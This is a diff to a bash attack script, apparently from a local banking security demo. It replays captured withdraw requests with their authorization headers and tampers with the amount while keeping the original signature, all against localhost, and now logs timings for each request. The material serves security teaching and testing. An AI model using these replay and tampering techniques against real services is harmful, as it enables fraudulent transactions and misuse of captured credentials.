@@ -4,14 +4,16 @@ set -euo pipefail
 HOST="localhost:3000"
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 PAYLOAD_FILE="$SCRIPT_DIR/payload.json"
-CAPTURE_FILE="/tmp/eve-captured.json"
+CAPTURE_FILE="${CAPTURE_FILE:-/tmp/eve-captured.json}"
 TAMPERED_FILE="/tmp/eve-tampered.json"
+TIMING_CSV="${TIMING_CSV:-/tmp/eve-attack-timings.csv}"
+RUN_ID="${ATTACK_RUN_ID:-$(date -u +%Y%m%dT%H%M%SZ)-$$}"
 
 usage() {
   cat <<EOF
 Usage:
   bash attack/attack.sh
-  bash attack/attack.sh --capture
+  bash attack/attack.sh --capture   (wait for experiments/recording-proxy.js capture)
   bash attack/attack.sh --replay [count]
   bash attack/attack.sh --tamper-amount AMOUNT
 EOF
@@ -53,15 +55,20 @@ validate_json_file() {
 }
 
 print_refresh_hint() {
-  echo "[EVE] Refresh path: reset demo, make a successful 1000 BDT withdraw in the Bank UI, then rerun this script."
-  echo "[EVE] The bank server syncs that exact accepted request into attack/payload.json."
+  echo "[EVE] Start the localhost recording proxy and point the bank UI at it, then make a successful local withdraw."
+  echo "[EVE] Set CAPTURE_FILE to the proxy's capture file as visible from WSL."
+}
+
+extract_body() {
+  local file="$1"
+  jq -c 'if has("request") then (.request.body | if type == "string" then fromjson else . end) else . end' "$file"
 }
 
 payload_age() {
   local file="$1"
   local payload_timestamp payload_epoch now_epoch
 
-  payload_timestamp="$(jq -r '.timestamp // empty' "$file")"
+  payload_timestamp="$(extract_body "$file" | jq -r '.timestamp // empty')"
   if [[ -z "$payload_timestamp" ]]; then
     echo "[EVE] Abort: payload timestamp is missing."
     print_refresh_hint
@@ -83,14 +90,45 @@ payload_age() {
   echo $((now_epoch - payload_epoch))
 }
 
+wallclock_ns() {
+  # WSL is the attacker shell only and does not require Node.js.
+  date +%s%N
+}
+
+send_timed_request() {
+  local scenario="$1" body_file="$2" auth="$3" index="$4"
+  local started ended response status body outcome duration
+  started="$(wallclock_ns)"
+  if [[ -n "$auth" ]]; then
+    response="$(curl -sS -w $'\n__HTTP_STATUS__:%{http_code}' -X POST "http://$HOST/api/withdraw" \
+      -H "Content-Type: application/json" -H "Authorization: $auth" -d "@$body_file")"
+  else
+    response="$(curl -sS -w $'\n__HTTP_STATUS__:%{http_code}' -X POST "http://$HOST/api/withdraw" \
+      -H "Content-Type: application/json" -d "@$body_file")"
+  fi
+  ended="$(wallclock_ns)"
+  status="${response##*__HTTP_STATUS__:}"
+  body="${response%$'\n'__HTTP_STATUS__:*}"
+  duration="$((ended - started))"
+  outcome="$(printf '%s' "$body" | jq -r '.reason // .status // .error // "UNKNOWN"' 2>/dev/null || echo UNKNOWN)"
+  if [[ ! -f "$TIMING_CSV" ]]; then
+    printf 'run_id,scenario_id,request_index,started_ns,ended_ns,duration_ns,http_status,outcome\n' >> "$TIMING_CSV"
+  fi
+  printf '%s,%s,%s,%s,%s,%s,%s,%s\n' "$RUN_ID" "$scenario" "$index" "$started" "$ended" "$duration" "$status" "$outcome" >> "$TIMING_CSV"
+  printf '%s\n' "$body" | jq .
+}
+
 send_payload() {
   local file="$1"
   local count="$2"
-  local age
+  local age auth body_file
 
   require_jq
   validate_json_file "$file"
   age="$(payload_age "$file")"
+  auth="$(jq -r '.request.headers.authorization // empty' "$file" 2>/dev/null || true)"
+  body_file="$(mktemp)"
+  extract_body "$file" > "$body_file"
 
   echo "[EVE] Starting Replay Attack on $HOST..."
   echo "[EVE] Payload: $file"
@@ -98,11 +136,14 @@ send_payload() {
 
   for ((i = 1; i <= count; i++)); do
     echo "[EVE] Replay attempt #$i..."
-    curl -s -X POST "http://$HOST/api/withdraw" \
-      -H "Content-Type: application/json" \
-      -d "@$file" | jq .
+    if [[ -n "$auth" ]]; then
+      send_timed_request "replay" "$body_file" "$auth" "$i"
+    else
+      send_timed_request "replay" "$body_file" "" "$i"
+    fi
     sleep 1
   done
+  rm -f "$body_file"
 }
 
 captured_source() {
@@ -121,13 +162,13 @@ capture_mode() {
   echo "[EVE] Monitoring captured request..."
 
   local previous_state current_state
-  previous_state="$(json_state "$PAYLOAD_FILE")"
+  previous_state="$(json_state "$CAPTURE_FILE")"
 
   trap 'echo; echo "[EVE] Capture watcher interrupted."; exit 130' INT
 
   while true; do
     sleep 1
-    current_state="$(json_state "$PAYLOAD_FILE")"
+    current_state="$(json_state "$CAPTURE_FILE")"
 
     if [[ "$current_state" == "$previous_state" ]]; then
       continue
@@ -135,16 +176,18 @@ capture_mode() {
 
     previous_state="$current_state"
 
-    if ! validate_json_file "$PAYLOAD_FILE"; then
-      echo "[EVE] Waiting for the next valid synchronized payload..."
+    if ! validate_json_file "$CAPTURE_FILE"; then
+      echo "[EVE] Waiting for the next valid proxy recording..."
+      continue
+    fi
+    local body_file
+    body_file="$(mktemp)"
+    if ! extract_body "$CAPTURE_FILE" > "$body_file" || ! jq -e . "$body_file" >/dev/null 2>&1; then
+      rm -f "$body_file"
       continue
     fi
 
-    cp "$PAYLOAD_FILE" "$CAPTURE_FILE"
-
-    echo "[EVE] ============================================"
     echo "[EVE] NEW WITHDRAW PACKET CAPTURED"
-    echo "[EVE] ============================================"
     jq -r '
       "[EVE] method: " + (.method | tostring),
       "[EVE] path: " + (.path | tostring),
@@ -152,9 +195,9 @@ capture_mode() {
       "[EVE] amount: " + (.amount | tostring),
       "[EVE] timestamp: " + (.timestamp | tostring),
       "[EVE] nonce: " + (.nonce | tostring),
-      "[EVE] request_id: " + (.request_id | tostring),
-      "[EVE] signature: " + (.signature | tostring)
-    ' "$CAPTURE_FILE"
+      "[EVE] request_id: " + (.request_id | tostring)
+    ' "$body_file"
+    rm -f "$body_file"
     echo "[EVE] Exact captured request saved to $CAPTURE_FILE"
     return
   done
@@ -182,7 +225,7 @@ replay_mode() {
 
 tamper_amount_mode() {
   local new_amount="$1"
-  local source original_amount signature
+  local source original_amount auth body_file
 
   require_jq
 
@@ -194,23 +237,26 @@ tamper_amount_mode() {
   source="$(captured_source)"
   validate_json_file "$source"
 
-  original_amount="$(jq -r '.amount // empty' "$source")"
-  signature="$(jq -r '.signature // empty' "$source")"
-  jq --argjson amount "$new_amount" '.amount = $amount' "$source" > "$TAMPERED_FILE"
+  original_amount="$(extract_body "$source" | jq -r '.amount // empty')"
+  auth="$(jq -r '.request.headers.authorization // empty' "$source" 2>/dev/null || true)"
+  jq --argjson amount "$new_amount" 'if has("request") then .request.body = ((if (.request.body|type)=="string" then (.request.body|fromjson) else .request.body end) | .amount=$amount | tojson) else .amount=$amount end' "$source" > "$TAMPERED_FILE"
 
-  echo "[EVE] ============================================"
   echo "[EVE] TAMPERING WITH CAPTURED PACKET"
-  echo "[EVE] ============================================"
   echo "[EVE] Source payload: $source"
   echo "[EVE] Original amount: $original_amount"
   echo "[EVE] Modified amount: $new_amount"
   echo "[EVE] Signature: UNCHANGED"
-  echo "[EVE] Preserved signature: $signature"
+  echo "[EVE] Signature: preserved without printing its value"
   echo "[EVE] Sending modified packet..."
 
-  curl -s -X POST "http://$HOST/api/withdraw" \
-    -H "Content-Type: application/json" \
-    -d "@$TAMPERED_FILE" | jq .
+  body_file="$(mktemp)"
+  extract_body "$TAMPERED_FILE" > "$body_file"
+  if [[ -n "$auth" ]]; then
+    send_timed_request "tamper" "$body_file" "$auth" 1
+  else
+    send_timed_request "tamper" "$body_file" "" 1
+  fi
+  rm -f "$body_file"
 }
 
 case "${1:-}" in
